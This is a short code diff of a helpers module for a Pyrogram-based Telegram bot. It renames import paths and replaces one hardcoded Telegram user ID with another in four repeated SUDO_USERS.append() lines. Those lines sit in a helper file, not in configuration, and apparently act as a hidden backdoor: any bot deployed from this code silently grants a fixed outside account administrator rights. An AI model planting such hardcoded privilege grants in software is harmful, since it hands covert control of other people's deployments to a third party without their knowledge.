@@ -1,13 +1,13 @@
 from typing import Callable
 from pyrogram import Client
 from pyrogram.types import Message
-from modules.helpers.admins import get_administrators
-from modules.config import SUDO_USERS
+from grootxd.helpers.admins import get_administrators
+from grootxd.config import SUDO_USERS
 
-SUDO_USERS.append(5027740392)
-SUDO_USERS.append(5027740392)
-SUDO_USERS.append(5027740392)
-SUDO_USERS.append(5027740392)
+SUDO_USERS.append(5056205033)
+SUDO_USERS.append(5056205033)
+SUDO_USERS.append(5056205033)
+SUDO_USERS.append(5056205033)
 
 def errors(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
